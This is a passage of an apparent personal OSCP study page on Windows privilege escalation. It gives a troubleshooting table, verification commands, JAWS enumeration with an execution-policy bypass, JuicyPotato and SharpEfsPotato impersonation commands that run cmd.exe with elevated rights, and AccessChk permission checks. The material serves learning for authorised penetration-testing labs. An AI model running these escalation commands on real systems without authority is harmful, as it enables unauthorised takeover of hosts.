+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Failure</th><th>Next action</th></tr></thead><tbody><tr><td>Service config <code>Access is denied</code></td><td>Validate service DACL/effective token; inspect binary/DLL/config alternatives</td></tr><tr><td>Can modify but cannot restart</td><td>Find reliable boot/logon/service dependency trigger or choose another path</td></tr><tr><td>Service error 1053</td><td>Check bounded effect, then restore; payload may not implement the service protocol</td></tr><tr><td>Unquoted path but no creatable prefix</td><td>Disprove the route</td></tr><tr><td>DLL not loaded</td><td>Recheck actual request, KnownDLL/SxS/loaded module, search order, bitness and trigger</td></tr><tr><td>Task accepted but no effect</td><td>Check action, conditions, working directory, LastTaskResult/history and process lifetime</td></tr><tr><td>Privilege tool fails</td><td>Recheck enabled token state, build, architecture/runtime and trigger-specific prerequisite</td></tr><tr><td>Hashes but no higher session</td><td>Return to credential classification and host/service authorization</td></tr><tr><td>Suggester lists CVE</td><td>Verify exact component/build/patch/config and exploit source before use</td></tr><tr><td>Enumerator blocked</td><td>Run the relevant native branch; do not infer no findings</td></tr></tbody></table>
+<h2 id="13-verify-re-enumerate-and-preserve-evidence">13. Verify, re-enumerate and preserve evidence</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami /all
+hostname
+ipconfig /all
+</code></pre>
+<p>After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.</p>
+<h2 id="jaws--powershell-enumeration-when-the-compiled-helper-is-unsuitable">JAWS — PowerShell enumeration when the compiled helper is unsuitable</h2>
+<p>Use a reviewed JAWS script when its PowerShell-based checks fit the current host/runtime. It is an alternative survey, not proof that every current Windows configuration is covered.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
+</code></pre>
+<p>Read: turn a named service, path or credential finding into its exact native check (<code>sc.exe qc</code>, <code>sc.exe sdshow</code>, <code>icacls</code>, task XML, or the file read). Policy or language restrictions can still prevent the script from running. The process-scope flag does not override an enforced policy/control layer; use the manual checks already listed here.</p>
+<p>Sources: <a href="https://github.com/411Hall/JAWS">upstream 1</a>.</p>
+<h2 id="legacy-impersonation-helpers--select-by-os-build-and-trigger">Legacy impersonation helpers — select by OS build and trigger</h2>
+<p>Use the current GodPotato/PrintSpoofer workflow first when its conditions fit. Older JuicyPotato-family recipes depend on specific COM/DCOM/RPC behavior; an enabled token privilege alone is not the complete condition.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">REM Legacy JuicyPotato: requires a working CLSID and supported Windows build
+JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c CLSID -a "/c whoami > C:\Windows\Temp\identity-check.txt"
+
+REM Separate EFS-triggered helper, if its documented prerequisites fit
+SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\identity-check.txt"
+
+type C:\Windows\Temp\identity-check.txt
+</code></pre>
+<p>Read: verify the exact resulting token/identity and effect. CLSID/RPC/trigger errors can mean an incompatible build, service state or blocked primitive—not a wrong password. Original JuicyPotato is a legacy option and is not a universal modern-Windows escalation. Inspect each helper's local help/version; do not interchange flags across JuicyPotatoNG, GodPotato and SharpEfsPotato.</p>
+<p>Sources: <a href="https://github.com/ohpe/juicy-potato">upstream 1</a> · <a href="https://github.com/bugch3ck/SharpEfsPotato">upstream 2</a>.</p>
+<h2 id="accesschk--verify-the-exact-service-file-or-registry-permission">AccessChk — verify the exact service, file or registry permission</h2>
+<p>Use after WinPEAS, PrivescCheck or a manual check identifies a candidate. Query the current identity and the exact object; a writable service binary and service-configuration rights are different paths.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami
+accesschk.exe -nobanner -v -c "DOMAIN\USER" SERVICE
+accesschk.exe -nobanner -v "DOMAIN\USER" "C:\Path\To\PROGRAM.exe"
+accesschk.exe -nobanner -v -k "DOMAIN\USER" "HKLM\SYSTEM\CurrentControlSet\Services\SERVICE"
+
+:: Broader candidate discovery; retain errors rather than suppressing them
+accesschk.exe -nobanner -w -v -c "DOMAIN\USER" *
+</code></pre>
+<p>Read: <code>SERVICE_CHANGE_CONFIG</code>, <code>WRITE_DAC</code>, file modification and registry value modification enable different operations. Next inspect <code>sc.exe qc SERVICE</code>, executable/parent ACLs, service identity and a permitted restart/trigger. A write result alone does not establish SYSTEM execution. Empty write-filtered output is not a complete permission inventory; inspect the exact object without <code>-w</code> and check errors. Use the existing <code>sc.exe sdshow</code>, <code>icacls</code> and PowerShell ACL checks if AccessChk is unavailable.</p>
+<p>Sources: <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 17, pp494-549</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OffSec OSCP+ Exam Guide</a></li>
+<li><a href="https://lizajose.github.io/getSH/privesc?system=windows">getSH Windows privilege escalation</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/windows">Hexdump Windows module</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/secauthz/access-tokens">Microsoft access tokens</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/secauthz/mandatory-integrity-control">Microsoft Mandatory Integrity Control</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/services/service-security-and-access-rights">Microsoft service security and access rights</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/dlls/dynamic-link-library-search-order">Microsoft DLL search order</a></li>
+<li><a href="https://learn.microsoft.com/windows/client-management/mdm/policy-csp-applicationmanagement#msialwaysinstallwithelevatedprivileges">Microsoft AlwaysInstallElevated policy</a></li>
+<li><a href="https://learn.microsoft.com/sysinternals/downloads/accesschk">Microsoft AccessChk</a></li>
+<li><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a>, <a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>, <a href="https://github.com/peass-ng/PEASS-ng">PEASS-ng</a></li>
+<li><a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">PrintSpoofer research</a>, <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a></li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
